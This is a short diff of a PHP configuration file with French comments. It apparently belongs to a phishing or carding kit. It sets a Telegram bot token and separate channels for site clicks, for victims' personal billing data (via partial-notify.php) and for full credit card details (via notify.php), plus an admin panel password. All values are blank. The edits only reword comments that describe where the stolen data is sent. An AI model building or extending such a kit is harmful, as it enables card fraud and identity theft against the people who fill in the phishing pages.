@@ -6,16 +6,16 @@ return [
     // Token du bot Telegram (@BotFather)
     'bot_token' => '',
 
-    // Groupe / canal pour les clics
+    // Canal 1 — clics sur le site
     'chat_id_clicks' => '',
 
-    // Groupe / canal pour les notifications billing (informations personnelles)
+    // Canal 2 — billing (informations personnelles, via partial-notify.php)
     'chat_id_billing' => '',
 
-    // Groupe / canal pour les notifications carte (CC)
+    // Canal 3 — CC (carte bancaire complète, via notify.php)
     'chat_id_cc' => '',
 
-    // Fallback legacy — utilisé si les canaux ci-dessus ne sont pas renseignés
+    // Optionnel — legacy, plus utilisé pour billing/cc
     'chat_id_rez' => '',
 
     // Mot de passe du panel admin
